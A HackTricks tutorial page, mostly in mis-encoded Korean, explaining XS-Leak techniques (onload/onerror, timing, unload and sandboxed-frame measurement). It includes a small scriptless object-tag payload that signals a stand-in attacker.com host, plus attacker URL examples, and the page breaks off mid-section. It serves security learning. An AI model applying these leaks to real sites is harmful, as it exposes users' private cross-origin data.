# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[****](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì ‘ê·¼í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

## ê¸°ë³¸ ì •ë³´

XS-SearchëŠ” **ì‚¬ì´ë“œ ì±„ë„ ì·¨ì•½ì **ì„ í™œìš©í•˜ì—¬ **êµì°¨ ì¶œì²˜ ì •ë³´**ë¥¼ **ì¶”ì¶œí•˜ëŠ” ë°©ë²•**ì…ë‹ˆë‹¤.

ì´ ê³µê²©ì— ê´€ë ¨ëœ ì£¼ìš” êµ¬ì„± ìš”ì†ŒëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* **ì·¨ì•½í•œ ì›¹**: ì •ë³´ê°€ ì¶”ì¶œë  ëŒ€ìƒ ì›¹ì‚¬ì´íŠ¸.
* **ê³µê²©ìì˜ ì›¹**: í”¼í•´ìê°€ ë°©ë¬¸í•˜ëŠ” ê³µê²©ìê°€ ë§Œë“  ì•…ì„± ì›¹ì‚¬ì´íŠ¸ë¡œ, ìµìŠ¤í”Œë¡œì‡ì„ í˜¸ìŠ¤íŒ…í•©ë‹ˆë‹¤.
* **í¬í•¨ ë°©ë²•**: ì·¨ì•½í•œ ì›¹ì„ ê³µê²©ìì˜ ì›¹ì— í¬í•¨ì‹œí‚¤ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ê¸°ìˆ (ì˜ˆ: window.open, iframe, fetch, hrefê°€ ìˆëŠ” HTML íƒœê·¸ ë“±).
* **ìœ ì¶œ ê¸°ìˆ **: í¬í•¨ ë°©ë²•ì„ í†µí•´ ìˆ˜ì§‘ëœ ì •ë³´ë¥¼ ë°”íƒ•ìœ¼ë¡œ ì·¨ì•½í•œ ì›¹ì˜ ìƒíƒœ ì°¨ì´ë¥¼ ì‹ë³„í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ê¸°ìˆ .
* **ìƒíƒœ**: ê³µê²©ìê°€ êµ¬ë³„í•˜ê³ ì í•˜ëŠ” ì·¨ì•½í•œ ì›¹ì˜ ë‘ ê°€ì§€ ì ì¬ì  ì¡°ê±´.
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ê³µê²©ìê°€ ì·¨ì•½í•œ ì›¹ì˜ ìƒíƒœë¥¼ ì¶”ë¡ í•˜ëŠ” ë° ì˜ì¡´í•˜ëŠ” ê´€ì°° ê°€ëŠ¥í•œ ë³€ë™.

### ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´

ì·¨ì•½í•œ ì›¹ì˜ ìƒíƒœë¥¼ êµ¬ë³„í•˜ê¸° ìœ„í•´ ë¶„ì„í•  ìˆ˜ ìˆëŠ” ì—¬ëŸ¬ ì¸¡ë©´ì´ ìˆìŠµë‹ˆë‹¤:

* **ìƒíƒœ ì½”ë“œ**: ì„œë²„ ì˜¤ë¥˜, í´ë¼ì´ì–¸íŠ¸ ì˜¤ë¥˜ ë˜ëŠ” ì¸ì¦ ì˜¤ë¥˜ì™€ ê°™ì€ **ë‹¤ì–‘í•œ HTTP ì‘ë‹µ ìƒíƒœ ì½”ë“œ**ë¥¼ êµì°¨ ì¶œì²˜ë¡œ êµ¬ë³„í•©ë‹ˆë‹¤.
* **API ì‚¬ìš©**: íŠ¹ì • JavaScript ì›¹ APIë¥¼ ì‚¬ìš©í•˜ëŠ”ì§€ ì—¬ë¶€ë¥¼ ë“œëŸ¬ë‚´ëŠ” **ì›¹ API ì‚¬ìš©**ì„ ì‹ë³„í•©ë‹ˆë‹¤.
* **ë¦¬ë””ë ‰ì…˜**: HTTP ë¦¬ë””ë ‰ì…˜ë¿ë§Œ ì•„ë‹ˆë¼ JavaScript ë˜ëŠ” HTMLì— ì˜í•´ íŠ¸ë¦¬ê±°ëœ ë‹¤ë¥¸ í˜ì´ì§€ë¡œì˜ íƒìƒ‰ì„ ê°ì§€í•©ë‹ˆë‹¤.
* **í˜ì´ì§€ ì½˜í…ì¸ **: **HTTP ì‘ë‹µ ë³¸ë¬¸** ë˜ëŠ” í˜ì´ì§€ í•˜ìœ„ ë¦¬ì†ŒìŠ¤ì—ì„œì˜ **ë³€ë™ ê´€ì°°**, ì˜ˆë¥¼ ë“¤ì–´ **ì„ë² ë””ë“œ í”„ë ˆì„ ìˆ˜** ë˜ëŠ” ì´ë¯¸ì§€ í¬ê¸° ì°¨ì´.
* **HTTP í—¤ë”**: **íŠ¹ì • HTTP ì‘ë‹µ í—¤ë”**ì˜ ì¡´ì¬ ë˜ëŠ” ê°’(ì˜ˆ: X-Frame-Options, Content-Disposition, Cross-Origin-Resource-Policy)ì„ ì£¼ëª©í•©ë‹ˆë‹¤.
* **íƒ€ì´ë°**: ë‘ ìƒíƒœ ê°„ì˜ ì¼ê´€ëœ ì‹œê°„ ì°¨ì´ë¥¼ ê°ì§€í•©ë‹ˆë‹¤.

### í¬í•¨ ë°©ë²•

* **HTML ìš”ì†Œ**: HTMLì€ **êµì°¨ ì¶œì²˜ ë¦¬ì†ŒìŠ¤ í¬í•¨**ì„ ìœ„í•œ ë‹¤ì–‘í•œ ìš”ì†Œë¥¼ ì œê³µí•˜ë©°, ìŠ¤íƒ€ì¼ì‹œíŠ¸, ì´ë¯¸ì§€ ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ì™€ ê°™ì€ ë¹„HTML ë¦¬ì†ŒìŠ¤ë¥¼ ìš”ì²­í•˜ë„ë¡ ë¸Œë¼ìš°ì €ë¥¼ ê°•ì œí•©ë‹ˆë‹¤. ì´ ëª©ì ì„ ìœ„í•œ ì ì¬ì  HTML ìš”ì†Œì˜ ëª©ë¡ì€ [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **í”„ë ˆì„**: **iframe**, **object**, **embed**ì™€ ê°™ì€ ìš”ì†ŒëŠ” HTML ë¦¬ì†ŒìŠ¤ë¥¼ ê³µê²©ìì˜ í˜ì´ì§€ì— ì§ì ‘ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í˜ì´ì§€ì— **í”„ë ˆì„ ë³´í˜¸ê°€ ì—†ëŠ” ê²½ìš°**, JavaScriptëŠ” contentWindow ì†ì„±ì„ í†µí•´ í”„ë ˆì„ëœ ë¦¬ì†ŒìŠ¤ì˜ window ê°ì²´ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **íŒì—…**: **`window.open`** ë©”ì„œë“œëŠ” ìƒˆ íƒ­ì´ë‚˜ ì°½ì—ì„œ ë¦¬ì†ŒìŠ¤ë¥¼ ì—´ì–´ JavaScriptê°€ SOPì— ë”°ë¼ ë©”ì„œë“œ ë° ì†ì„±ê³¼ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆëŠ” **ì°½ í•¸ë“¤**ì„ ì œê³µí•©ë‹ˆë‹¤. íŒì—…ì€ ì¢…ì¢… ë‹¨ì¼ ë¡œê·¸ì¸ì—ì„œ ì‚¬ìš©ë˜ë©°, ëŒ€ìƒ ë¦¬ì†ŒìŠ¤ì˜ í”„ë ˆì„ ë° ì¿ í‚¤ ì œí•œì„ ìš°íšŒí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ìµœì‹  ë¸Œë¼ìš°ì €ëŠ” íŠ¹ì • ì‚¬ìš©ì ì‘ì—…ì—ë§Œ íŒì—… ìƒì„±ì„ ì œí•œí•©ë‹ˆë‹¤.
* **JavaScript ìš”ì²­**: JavaScriptëŠ” **XMLHttpRequests** ë˜ëŠ” **Fetch API**ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒ ë¦¬ì†ŒìŠ¤ì— ì§ì ‘ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ë°©ë²•ì€ HTTP ë¦¬ë””ë ‰ì…˜ì„ ë”°ë¥´ë„ë¡ ì„ íƒí•˜ëŠ” ë“± ìš”ì²­ì— ëŒ€í•œ ì •ë°€í•œ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### ìœ ì¶œ ê¸°ìˆ 

* **ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬**: XS-Leaksì—ì„œ ê³ ì „ì ì¸ ìœ ì¶œ ê¸°ìˆ ë¡œ, **onload** ë° **onerror**ì™€ ê°™ì€ ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ê°€ ë¦¬ì†ŒìŠ¤ ë¡œë”© ì„±ê³µ ë˜ëŠ” ì‹¤íŒ¨ì— ëŒ€í•œ í†µì°°ë ¥ì„ ì œê³µí•©ë‹ˆë‹¤.
* **ì˜¤ë¥˜ ë©”ì‹œì§€**: JavaScript ì˜ˆì™¸ ë˜ëŠ” íŠ¹ìˆ˜ ì˜¤ë¥˜ í˜ì´ì§€ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€ì˜ ì¡´ì¬ ì—¬ë¶€ì— ë”°ë¼ ìœ ì¶œ ì •ë³´ë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì „ì—­ í•œê³„**: ë©”ëª¨ë¦¬ ìš©ëŸ‰ ë˜ëŠ” ê¸°íƒ€ ê°•ì œ ë¸Œë¼ìš°ì € í•œê³„ì™€ ê°™ì€ ë¸Œë¼ìš°ì €ì˜ ë¬¼ë¦¬ì  ì œí•œì€ ì„ê³„ê°’ì— ë„ë‹¬í–ˆìŒì„ ì‹ í˜¸ë¡œ ì œê³µí•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ìœ ì¶œ ê¸°ìˆ ë¡œ ì‘ìš©í•©ë‹ˆë‹¤.
* **ì „ì—­ ìƒíƒœ**: ë¸Œë¼ìš°ì €ì˜ **ì „ì—­ ìƒíƒœ**(ì˜ˆ: History ì¸í„°í˜ì´ìŠ¤)ì™€ì˜ ê°ì§€ ê°€ëŠ¥í•œ ìƒí˜¸ì‘ìš©ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¸Œë¼ìš°ì €ì˜ ê¸°ë¡ì— ìˆëŠ” **í•­ëª© ìˆ˜**ëŠ” êµì°¨ ì¶œì²˜ í˜ì´ì§€ì— ëŒ€í•œ ë‹¨ì„œë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì„±ëŠ¥ API**: ì´ APIëŠ” **í˜„ì¬ í˜ì´ì§€ì˜ ì„±ëŠ¥ ì„¸ë¶€ì •ë³´**ë¥¼ ì œê³µí•˜ë©°, ë¬¸ì„œ ë° ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ë„¤íŠ¸ì›Œí¬ íƒ€ì´ë°ì„ í¬í•¨í•˜ì—¬ ìš”ì²­ëœ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ì¶”ë¡ ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.
* **ì½ê¸° ê°€ëŠ¥í•œ ì†ì„±**: ì¼ë¶€ HTML ì†ì„±ì€ **êµì°¨ ì¶œì²˜ë¡œ ì½ì„ ìˆ˜ ìˆìœ¼ë©°**, ìœ ì¶œ ê¸°ìˆ ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `window.frame.length` ì†ì„±ì€ JavaScriptê°€ êµì°¨ ì¶œì²˜ ì›¹í˜ì´ì§€ì— í¬í•¨ëœ í”„ë ˆì„ ìˆ˜ë¥¼ ê³„ì‚°í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

## XSinator ë„êµ¬ ë° ë…¼ë¬¸

XSinatorëŠ” **ì—¬ëŸ¬ ì•Œë ¤ì§„ XS-Leaksì— ëŒ€í•´ ë¸Œë¼ìš°ì €ë¥¼ í™•ì¸í•˜ëŠ” ìë™ ë„êµ¬**ë¡œ, ê·¸ ë…¼ë¬¸ì—ì„œ ì„¤ëª…ë©ë‹ˆë‹¤: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

ë„êµ¬ì— **ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê³³**: [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**ì œì™¸ëœ XS-Leaks**: XSinatorì˜ ë‹¤ë¥¸ ìœ ì¶œê³¼ ê°„ì„­í•  ìˆ˜ ìˆëŠ” **ì„œë¹„ìŠ¤ ì›Œì»¤**ì— ì˜ì¡´í•˜ëŠ” XS-LeaksëŠ” ì œì™¸í•´ì•¼ í–ˆìŠµë‹ˆë‹¤. ë˜í•œ, íŠ¹ì • ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì˜ëª»ëœ êµ¬ì„± ë° ë²„ê·¸ì— ì˜ì¡´í•˜ëŠ” XS-Leaksë„ **ì œì™¸í•˜ê¸°ë¡œ ì„ íƒí–ˆìŠµë‹ˆë‹¤**. ì˜ˆë¥¼ ë“¤ì–´, CrossOrigin Resource Sharing (CORS) ì˜ëª»ëœ êµ¬ì„±, postMessage ìœ ì¶œ ë˜ëŠ” Cross-Site Scripting. ë˜í•œ, ëŠë¦¬ê³  ì‹œë„ëŸ½ê³  ë¶€ì •í™•í•œ ê²½ìš°ê°€ ë§ê¸° ë•Œë¬¸ì— ì‹œê°„ ê¸°ë°˜ XS-Leaksë„ ì œì™¸í–ˆìŠµë‹ˆë‹¤.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ **ê°€ì¥ ì§„ë³´ëœ** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ë°”ë¡œ ì ‘ê·¼í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## **íƒ€ì´ë° ê¸°ë°˜ ê¸°ìˆ **

ë‹¤ìŒ ê¸°ìˆ  ì¤‘ ì¼ë¶€ëŠ” ì›¹ í˜ì´ì§€ì˜ ê°€ëŠ¥í•œ ìƒíƒœì—ì„œ ì°¨ì´ë¥¼ ê°ì§€í•˜ëŠ” ê³¼ì •ì˜ ì¼í™˜ìœ¼ë¡œ íƒ€ì´ë°ì„ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤. ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ ì‹œê°„ì„ ì¸¡ì •í•˜ëŠ” ë°©ë²•ì€ ì—¬ëŸ¬ ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.

**ì‹œê³„**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) APIëŠ” ê°œë°œìê°€ ê³ í•´ìƒë„ íƒ€ì´ë° ì¸¡ì •ì„ ì–»ì„ ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.\
ê³µê²©ìê°€ ì•”ë¬µì ì¸ ì‹œê³„ë¥¼ ë§Œë“¤ê¸° ìœ„í•´ ë‚¨ìš©í•  ìˆ˜ ìˆëŠ” APIì˜ ìˆ˜ê°€ ìƒë‹¹í•©ë‹ˆë‹¤: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS ì• ë‹ˆë©”ì´ì…˜ ë“±.\
ìì„¸í•œ ì •ë³´ëŠ”: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ ê¸°ìˆ 

### Onload/Onerror

* **í¬í•¨ ë°©ë²•**: í”„ë ˆì„, HTML ìš”ì†Œ
* **ê°ì§€ ê°€ëŠ¥í•œ ì°¨ì´**: ìƒíƒœ ì½”ë“œ
* **ìì„¸í•œ ì •ë³´**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **ìš”ì•½**: ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•˜ë ¤ê³  í•  ë•Œ onerror/onload ì´ë²¤íŠ¸ê°€ ë¦¬ì†ŒìŠ¤ê°€ ì„±ê³µì ìœ¼ë¡œ/ì‹¤íŒ¨ì ìœ¼ë¡œ ë¡œë“œë˜ë©´ íŠ¸ë¦¬ê±°ë˜ë©°, ìƒíƒœ ì½”ë“œë¥¼ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì½”ë“œ ì˜ˆì œ**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

ì½”ë“œ ì˜ˆì œëŠ” **JSì—ì„œ ìŠ¤í¬ë¦½íŠ¸ ê°ì²´ë¥¼ ë¡œë“œí•˜ë ¤ê³  ì‹œë„í•˜ì§€ë§Œ**, **ê°ì²´**, ìŠ¤íƒ€ì¼ì‹œíŠ¸, ì´ë¯¸ì§€, ì˜¤ë””ì˜¤ì™€ ê°™ì€ **ë‹¤ë¥¸ íƒœê·¸**ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, **íƒœê·¸ë¥¼ ì§ì ‘ ì£¼ì…**í•˜ê³  íƒœê·¸ ë‚´ë¶€ì— `onload` ë° `onerror` ì´ë²¤íŠ¸ë¥¼ ì„ ì–¸í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤(ëŒ€ì‹  JSì—ì„œ ì£¼ì…í•˜ëŠ” ëŒ€ì‹ ).

ì´ ê³µê²©ì˜ ìŠ¤í¬ë¦½íŠ¸ ì—†ëŠ” ë²„ì „ë„ ìˆìŠµë‹ˆë‹¤:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** can be used to measure how much time it takes to perform a request. However, other clocks could be used, such as [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) which can identify tasks running for more than 50ms.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) another example in:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

ì´ ê¸°ìˆ ì€ ì´ì „ ê¸°ìˆ ê³¼ ìœ ì‚¬í•˜ì§€ë§Œ, **ê³µê²©ì**ëŠ” **ê¸ì •ì  ë˜ëŠ” ë¶€ì •ì  ì‘ë‹µ**ì´ ìˆì„ ë•Œ **ìƒë‹¹í•œ ì‹œê°„**ì´ ê±¸ë¦¬ë„ë¡ **ê°•ì œ**í•˜ëŠ” ì‘ì—…ì„ ìˆ˜í–‰í•˜ê³  ê·¸ ì‹œê°„ì„ ì¸¡ì •í•©ë‹ˆë‹¤.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) can be used to measure how much time it takes to perform a request. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ì ¸ì˜¤ëŠ” ë° ê±¸ë¦¬ëŠ” ì‹œê°„ì€ [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) ë° [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) ì´ë²¤íŠ¸ë¥¼ í™œìš©í•˜ì—¬ ì¸¡ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`beforeunload`** ì´ë²¤íŠ¸ëŠ” ë¸Œë¼ìš°ì €ê°€ ìƒˆ í˜ì´ì§€ë¡œ ì´ë™í•˜ê¸° ì§ì „ì— ë°œìƒí•˜ë©°, **`unload`** ì´ë²¤íŠ¸ëŠ” ì‹¤ì œë¡œ ì´ë™ì´ ì´ë£¨ì–´ì§ˆ ë•Œ ë°œìƒí•©ë‹ˆë‹¤. ì´ ë‘ ì´ë²¤íŠ¸ ê°„ì˜ ì‹œê°„ ì°¨ì´ë¥¼ ê³„ì‚°í•˜ì—¬ **ë¸Œë¼ìš°ì €ê°€ ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ì ¸ì˜¤ëŠ” ë° ì†Œìš”ëœ ì‹œê°„**ì„ ê²°ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API can be used to measure how much time it takes to perform a request. Other clocks could be used.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

[Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/)ì´ ì—†ëŠ” ê²½ìš°, í˜ì´ì§€ì™€ ê·¸ í•˜ìœ„ ë¦¬ì†ŒìŠ¤ê°€ ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ë¡œë“œë˜ëŠ” ë° í•„ìš”í•œ ì‹œê°„ì„ ê³µê²©ìê°€ ì¸¡ì •í•  ìˆ˜ ìˆëŠ” ê²ƒìœ¼ë¡œ ê´€ì°°ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì¸¡ì •ì€ ì¼ë°˜ì ìœ¼ë¡œ iframeì˜ `onload` í•¸ë“¤ëŸ¬ê°€ ë¦¬ì†ŒìŠ¤ ë¡œë”© ë° JavaScript ì‹¤í–‰ì´ ì™„ë£Œëœ í›„ì—ë§Œ íŠ¸ë¦¬ê±°ë˜ê¸° ë•Œë¬¸ì— ê°€ëŠ¥í•©ë‹ˆë‹¤. ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ìœ¼ë¡œ ì¸í•œ ë³€ë™ì„±ì„ ìš°íšŒí•˜ê¸° ìœ„í•´, ê³µê²©ìëŠ” `<iframe>` ë‚´ì—ì„œ [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) ì†ì„±ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì†ì„±ì„ í¬í•¨í•˜ë©´ JavaScript ì‹¤í–‰ê³¼ ê°™ì€ ì—¬ëŸ¬ ê¸°ëŠ¥ì´ ì œí•œë˜ì–´ ë„¤íŠ¸ì›Œí¬ ì„±ëŠ¥ì— ì£¼ë¡œ ì˜í–¥ì„ ë°›ëŠ” ì¸¡ì •ì„ ìš©ì´í•˜ê²Œ í•©ë‹ˆë‹¤.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary**: ì˜¬ë°”ë¥¸ ì½˜í…ì¸ ì— ì ‘ê·¼í•  ë•Œ í˜ì´ì§€ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ê³ , ì–´ë–¤ ì½˜í…ì¸ ì— ì ‘ê·¼í•  ë•Œ ì˜¬ë°”ë¥´ê²Œ ë¡œë“œë˜ë„ë¡ í•  ìˆ˜ ìˆë‹¤ë©´, ì‹œê°„ì„ ì¸¡ì •í•˜ì§€ ì•Šê³  ëª¨ë“  ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ë£¨í”„ë¥¼ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Code Example**:

ë¹„ë°€ ì½˜í…ì¸ ê°€ í¬í•¨ëœ í˜ì´ì§€ë¥¼ **Iframe** ì•ˆì— **ì‚½ì…**í•  ìˆ˜ ìˆë‹¤ê³  ê°€ì •í•´ ë³´ê² ìŠµë‹ˆë‹¤.

í”¼í•´ìê°€ **Iframe**ì„ ì‚¬ìš©í•˜ì—¬ "_**flag**_"ê°€ í¬í•¨ëœ íŒŒì¼ì„ **ê²€ìƒ‰**í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì˜ˆ: CSRFë¥¼ ì•…ìš©). Iframe ì•ˆì—ì„œëŠ” _**onload event**_ê°€ **í•­ìƒ ìµœì†Œí•œ í•œ ë²ˆì€ ì‹¤í–‰**ë  ê²ƒì„ì„ ì•Œê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, **URL**ì˜ **iframe**ì„ **ë³€ê²½**í•  ìˆ˜ ìˆì§€ë§Œ URLì˜ **hash**ì˜ **ë‚´ìš©**ë§Œ ë³€ê²½í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

